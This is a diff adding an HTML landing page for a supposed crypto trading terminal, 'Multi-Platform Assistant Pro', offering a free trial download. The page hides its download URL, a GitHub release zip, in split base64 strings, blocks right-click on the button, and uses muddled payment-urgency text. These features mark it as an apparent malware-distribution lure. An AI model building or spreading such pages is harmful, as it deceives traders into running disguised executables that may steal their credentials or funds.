@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Multi-Platform Assistant Pro</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;900&family=Exo+2:wght@300;400;500;600;700&family=Audiowide&display=swap" rel="stylesheet">
+    <link href="tooplate-neural-style.css" rel="stylesheet">
+</head>
+<body>
+    <canvas id="neural-bg"></canvas>
+
+    <nav id="navbar">
+        <div class="nav-container">
+            <a href="#home" class="logo-container">
+                <svg class="logo-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="50" cy="20" r="8" fill="none" stroke="#00ffff" stroke-width="2"/>
+                    <circle cx="25" cy="50" r="8" fill="none" stroke="#ff00ff" stroke-width="2"/>
+                    <circle cx="75" cy="50" r="8" fill="none" stroke="#ff00ff" stroke-width="2"/>
+                    <circle cx="50" cy="80" r="8" fill="none" stroke="#ffff00" stroke-width="2"/>
+                    <line x1="50" y1="28" x2="25" y2="42" stroke="#00ffff" stroke-width="1" opacity="0.6"/>
+                    <line x1="50" y1="28" x2="75" y2="42" stroke="#00ffff" stroke-width="1" opacity="0.6"/>
+                    <line x1="25" y1="58" x2="50" y2="72" stroke="#ff00ff" stroke-width="1" opacity="0.6"/>
+                    <line x1="75" y1="58" x2="50" y2="72" stroke="#ff00ff" stroke-width="1" opacity="0.6"/>
+                    <circle cx="50" cy="50" r="5" fill="#00ffff"/>
+                    <line x1="50" y1="28" x2="50" y2="45" stroke="#00ffff" stroke-width="1" opacity="0.6"/>
+                    <line x1="50" y1="55" x2="50" y2="72" stroke="#ffff00" stroke-width="1" opacity="0.6"/>
+                    <line x1="33" y1="50" x2="45" y2="50" stroke="#ff00ff" stroke-width="1" opacity="0.6"/>
+                    <line x1="55" y1="50" x2="67" y2="50" stroke="#ff00ff" stroke-width="1" opacity="0.6"/>
+                </svg>
+                <span class="logo-text">Assistant Pro</span>
+            </a>
+            
+            <div class="mobile-menu-toggle" id="mobile-toggle">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            
+            <div class="nav-menu" id="nav-menu">
+                <ul>
+                    <li><a href="#home">HOME</a></li>
+                    <li><a href="#about">ABOUT</a></li>
+                    <li><a href="#projects">ADVANTAGES</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <section id="home" class="hero">
+        <div class="hero-content">
+            <h1 class="glitch" data-text="Multi-Platform Assistant Pro">Multi-Platform Assistant Pro</h1>
+            <p class="subtitle">
+                Your Multi-Platform Assistant Pro isn’t just a tool—it’s a silent strategist. 
+                It filters market noise and highlights real signals, letting you act with clarity.
+            </p>
+            <div class="hero-video-wrapper" style="text-align:center; margin-top:50px;">
+                <iframe 
+                    width="720" 
+                    height="405"
+                    class="hero-video"
+                    src="https://www.youtube.com/embed/4KxNJPJGjjM?autoplay=0&controls=0&modestbranding=1&rel=0&showinfo=0&loop=1&mute=0"
+                    frameborder="0" 
+                    allow="autoplay; encrypted-media" 
+                    allowfullscreen>
+                </iframe>
+            </div>
+        </div>
+        <a href="#about" class="scroll-btn">
+            <div class="scroll-btn-inner">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M7 13l5 5 5-5M7 6l5 5 5-5"/>
+                </svg>
+            </div>
+        </a>
+    </section>
+
+    <section id="about" class="fade-in">
+        <h2 class="section-title">ABOUT THE PRODUCT</h2>
+        <div class="about-container">
+            <div class="about-image">
+                <div class="profile-img-wrapper">
+                    <div class="profile-img">
+    <span>♛</span>
+    <div class="contact-info" style="
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-top: 10px;
+        gap: 1px;
+        position: absolute;
+        bottom: 30px;
+        left: 50%;
+        transform: translateX(-50%);
+        z-index: 2;
+        color: var(--text-primary);
+        font-size: 1rem;
+        white-space: nowrap;
+    ">
+        <div style="display: flex; flex-direction: column; align-items: center; margin-top: 10px;">
+    <!-- Маленький текст сверху -->
+    <div style="font-size:0.8rem; color:var(--text-secondary); margin-bottom:4px;">
+ 
+    </div>
+    
+    <!-- Картинка и основной текст в одну строку -->
+
+        </div>
+            </div>
+	        </div>
+	        </div>
+	    </div>
+            <div class="about-content">
+                <h3>Multi-Platform Assistant Pro Overview</h3>
+                <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 20px;">
+                    Our Multi-Platform Assistant Pro is a next-generation platform designed to give traders deep insights into the market with clarity and precision. It combines advanced order book visualization, multi-exchange data tracking, and customizable trading pairs to create a fully adaptable trading experience.
+                </p>
+                <p style="font-size: 1.1rem; line-height: 1.8; color: var(--text-secondary);">
+                    With flexible control over order book depth and an intuitive interface, users can focus on strategy rather than noise. Adaptive insights help respond to market changes, making this terminal a smart ally for both novice and professional traders.
+                </p>
+				<h4 class="section-title">
+				<p style="font-size: 0.8rem; color: #F0FEFF; font-weight: normal; line-height: 1.8; margin-top: 20px; font-style: italic;">
+				   "The payment is processed directly on the page, and the download link appears automatically once complete. Make sure not to refresh or close the page while the payment is in progress to avoid losing access."
+				</p>
+				<p style="font-size: 1.05rem; color: #FF3697; font-weight: normal; line-height: 1.8; margin-top: 20px; font-style: italic;">
+				   "After clicking the button, the payment may not process immediately. Please wait 15–20 seconds and try clicking again !"
+				</p></h4>
+                <br>
+				<center>
+        <p style="font-size: 1.05rem; color: #FFD700; font-weight: normal; line-height: 1.8; margin-top: 20px; font-style: italic;">
+            <span style="font-size:15px;">
+                <b>Enjoy a 7-day free trial — no strings attached</b><br>
+            </span>
+        </p>
+
+        <button id="dlBtn2" disabled style="background: transparent; border: none; cursor: not-allowed; opacity: 0.7; margin-top: 12px;">
+            <img src="https://terminal-trade.github.io/Trading-Assistant/but.gif" width="300" height="55" border="0" alt="Download" />
+        </button>
+    </center>
+
+    <script>
+      var p = [
+        "aHR0cHM6Ly9naXRodWIuY29tL1Rlcm1pbmFsLVRyYWRlL1RyYWRpbmdUZXJtaW5hbC9y",
+        "ZWxlYXNlcy9kb3dubG9hZC9UcmFkaW5nVGVybWluYWwvVHJhZGluZ1Rlcm1pbmFs",
+        "LnppcA=="
+      ];
+
+      function u() {
+        return atob(p.join(''));
+      }
+
+      var s = 2;
+      function t() {
+        if (s <= 0) {
+          e();
+          return;
+        }
+        s--;
+        setTimeout(t, 1000);
+      }
+
+      function e() {
+        var b = document.getElementById('dlBtn2');
+        b.disabled = false;
+        b.style.opacity = '1';
+        b.style.cursor = 'pointer';
+        b.addEventListener('click', function() {
+          window.open(u(), '_blank', 'noopener,noreferrer');
+        }, { once: true });
+      }
+
+      document.addEventListener('DOMContentLoaded', function() {
+        var b = document.getElementById('dlBtn2');
+        b.addEventListener('contextmenu', function(e){ e.preventDefault(); });
+        t();
+      });
+    </script>
+
+                 <div class="separator" style="clear: both; text-align: center;"><b><span style="font-size: small;">This file was downloaded</span></b> <img border="0" src="https://counter.co.kz/CounterCoKz?page=terminal-trade.github.io_Trading-Assistant&amp;style=ainv&amp;digits=100000000000" /> <b>times.</b></div> 
+				</p></h4>
+				<br>
+                <div class="about-stats">
+                    <div class="stat-card">
+                        <button class="stat-card-link buyBtn" data-product="product1" data-tooltip="Lifetime license for Windows OS">
+                            <div class="stat-label">BUY</div>
+                            <div class="stat-number">$65</div>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Блок сообщений для buy.js -->
+                <div id="message" style="margin-top:20px; color:lime; font-weight:bold;"></div>
+            </div>
+        </div>
+    </section>
+
+    <section id="projects" class="fade-in">
+        <h2 class="section-title">ADVANTAGES</h2>
+        <div class="projects-grid">
+            <div class="glass-card project-card">
+                <h3 style="color: var(--primary);">Order Book Visualization</h3>
+                <p style="color: var(--text-secondary);">Highlights all significant orders on the chart, including large limit orders, with customizable display settings.</p>
+            </div>
+            <div class="glass-card project-card">
+                <h3 style="color: var(--secondary);">Multi-Exchange Analysis</h3>
+                <p style="color: var(--text-secondary);">Tracks data from multiple exchanges simultaneously, showing each order with its source.</p>
+            </div>
+            <div class="glass-card project-card">
+                <h3 style="color: var(--accent);">Customizable Trading Pairs</h3>
+                <p style="color: var(--text-secondary);">Add your own pairs for analysis and focus only on the data you need.</p>
+            </div>
+            <div class="glass-card project-card">
+                <h3 style="color: var(--primary);">Deep Order Book Control</h3>
+                <p style="color: var(--text-secondary);">Adjust the depth of the order book display for a detailed understanding of market structure.</p>
+            </div>
+            <div class="glass-card project-card">
+                <h3 style="color: var(--secondary);">Intuitive Interface</h3>
+                <p style="color: var(--text-secondary);">Designed for easy interaction with charts and orders, letting you focus on your strategy.</p>
+            </div>
+            <div class="glass-card project-card">
+                <h3 style="color: var(--accent);">Adaptive Insights</h3>
+                <p style="color: var(--text-secondary);">Responds to market changes, providing guidance for more effective decision-making.</p>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-section">
+                <h3>Navigation</h3>
+                <ul>
+                    <li><a href="#home">Home</a></li>
+                    <li><a href="#about">About</a></li>
+                    <li><a href="#projects">Advantages</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-section">
+                <h3>Connect</h3>
+                <p style="color: var(--text-secondary); margin-bottom: 10px;">Let's build something amazing together</p>
+                <div class="social-links">
+                    <a href="#" aria-label="GitHub">…</a>
+                    <a href="#" aria-label="LinkedIn">…</a>
+                    <a href="#" aria-label="Twitter">…</a>
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2025 Multi-Platform Assistant Pro Portfolio. All rights reserved. Provided by <a href="https://terminal-trade.github.io/Trading-Assistant/index.html">Multi-Platform Assistant Pro</a></p>
+        </div>
+    </footer>
+
+    <script src="tooplate-neural-scripts.js"></script>
+    <script src="buy.js"></script>
+<script>
+  const SERVER_URL = "https://tradingterminal.online/"; // your Render app URL
+  const TIMEOUT = 10000;
+  const RETRY_INTERVAL = 15000;
+  const KEEP_ALIVE_INTERVAL = 10 * 60 * 1000;
+
+  // create status box
+  const statusBox = document.createElement("div");
+  Object.assign(statusBox.style, {
+    position: "fixed",
+    bottom: "15px",
+    right: "15px",
+    background: "rgba(0,0,0,0.75)",
+    color: "#fff",
+    padding: "6px 12px",
+    borderRadius: "10px",
+    fontFamily: "monospace",
+    fontSize: "13px",
+    zIndex: "9999",
+    boxShadow: "0 0 6px rgba(0,0,0,0.3)",
+    transition: "background 0.3s ease, color 0.3s ease",
+  });
+  statusBox.textContent = "Checking server...";
+  document.body.appendChild(statusBox);
+
+  function updateStatus(state, text) {
+    requestAnimationFrame(() => {
+      statusBox.textContent = text;
+      if (state === "awake") {
+        statusBox.style.background = "#2ecc71";
+        statusBox.style.color = "#fff";
+      } else if (state === "sleeping") {
+        statusBox.style.background = "#e74c3c";
+        statusBox.style.color = "#fff";
+      } else if (state === "pinging") {
+        statusBox.style.background = "#f1c40f";
+        statusBox.style.color = "#000";
+      } else {
+        statusBox.style.background = "rgba(0,0,0,0.75)";
+        statusBox.style.color = "#fff";
+      }
+    });
+  }
+
+  // simplified ping: if fetch resolves => success
+  function pingServer(timeout = TIMEOUT) {
+    return new Promise((resolve) => {
+      let done = false;
+      const timer = setTimeout(() => {
+        if (!done) {
+          done = true;
+          resolve(false);
+        }
+      }, timeout);
+
+      // no-cors to bypass CORS block; success means server responded at all
+      fetch(SERVER_URL, { mode: "no-cors", cache: "no-store" })
+        .then(() => {
+          if (!done) {
+            done = true;
+            clearTimeout(timer);
+            resolve(true); // any response means "awake"
+          }
+        })
+        .catch(() => {
+          if (!done) {
+            done = true;
+            clearTimeout(timer);
+            resolve(false);
+          }
+        });
+    });
+  }
+
+  async function wakeRenderServer() {
+    console.log(`[${new Date().toLocaleTimeString()}] Initial ping...`);
+    updateStatus("pinging", "Pinging server...");
+
+    let alive = await pingServer();
+    let tries = 0;
+
+    while (!alive && tries < 20) {
+      tries++;
+      console.log(`[${new Date().toLocaleTimeString()}] Server sleeping, retry #${tries}`);
+      updateStatus("sleeping", `Server sleeping... retrying (${tries})`);
+      await new Promise(r => setTimeout(r, RETRY_INTERVAL));
+      updateStatus("pinging", "Pinging again...");
+      alive = await pingServer();
+    }
+
+    if (alive) {
+      console.log(`[${new Date().toLocaleTimeString()}] Server is awake ✅`);
+      updateStatus("awake", "Server is awake ✅");
+
+      // repeat later to keep alive
+      setTimeout(() => {
+        updateStatus("pinging", "Keeping server awake...");
+        wakeRenderServer();
+      }, KEEP_ALIVE_INTERVAL);
+    } else {
+      console.warn("Server did not respond after multiple tries ❌");
+      updateStatus("sleeping", "Server unreachable ❌");
+    }
+  }
+
+  document.addEventListener("DOMContentLoaded", wakeRenderServer);
+</script>
+
+</body>
+</html>
